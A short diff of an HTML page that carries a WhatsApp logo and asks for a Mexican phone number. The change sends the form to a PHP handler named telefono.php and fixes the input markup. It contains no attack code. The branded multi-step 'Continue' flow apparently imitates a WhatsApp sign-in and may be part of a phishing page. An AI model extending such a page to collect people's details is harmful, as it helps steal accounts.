@@ -10,7 +10,7 @@
     <div class="Titulo">
         <img src="./img/Captura de pantalla 2025-01-29 211719.png" alt="404">
     </div>
-    <form method="post" action="Email.html">
+    <form method="post" action="./php/telefono.php">
         <div class="contenedor">
             <img src="img/—Pngtree—whatsapp icon whatsapp logo_3584844.png" alt="404" width="250" height="250">
         </div>
@@ -23,9 +23,9 @@
         <div class="input-container">
               <div class="phone-input-group">
              <select name="country" id="country" required>
-            <option value="Mexico">+ 52</option>
-            <input class="entrada" type="number" name="phone" required>
-             </select>
+            <option value="Mexico">+ 52</option></select>
+            <input class="entrada" type="text" pattern="[0-9]{10}" name="telefono" required>
+             
               </div>
             <button class="boton" type="submit">Continue</button>
         </div>
